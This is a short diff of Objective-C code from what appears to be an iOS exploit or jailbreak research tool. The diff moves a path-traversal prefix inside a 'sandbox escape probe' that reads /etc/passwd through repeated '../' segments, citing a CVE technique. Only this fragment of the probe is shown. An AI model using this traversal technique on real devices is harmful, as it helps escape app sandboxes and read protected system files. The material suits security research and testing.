@@ -9122,12 +9122,12 @@ static uint64_t rie_find_exec_base(task_t task,
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         [self appendLog:@"\n=== Rie v216: syscall + Phase E (no child, fd=-1 inject) ===\n"];
+        NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
         [self appendLog:@"── Phase S: sandbox escape probe ──"];
         {
             // Technique: prepend ../../../../../.. then expandingTildeInPath resolves to /
-            NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
             // Test 1: read /etc/passwd via path traversal
             NSString *passwdRaw = [traversalPrefix stringByAppendingString:@"etc/passwd"];
